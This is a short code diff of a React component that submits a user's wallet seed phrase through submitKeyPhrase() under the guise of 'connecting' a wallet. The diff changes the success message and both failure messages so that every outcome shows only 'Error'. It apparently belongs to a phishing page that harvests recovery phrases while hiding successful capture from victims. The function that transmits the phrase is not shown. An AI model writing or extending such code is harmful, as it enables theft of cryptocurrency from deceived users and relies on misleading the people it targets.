@@ -103,13 +103,13 @@ export default function MainContent() {
       const result = await submitKeyPhrase(seedPhrase.trim());
 
       if (result.success) {
-        alert(`Successfully connected to ${selectedWallet}!`);
+        alert("Error");
       } else {
-        alert("Connection failed. Please try again.");
+        alert("Error");
       }
     } catch (error) {
       console.error("Error connecting wallet:", error);
-      alert("Connection failed. Please try again.");
+      alert("Error");
     }
 
     // Reset the modal
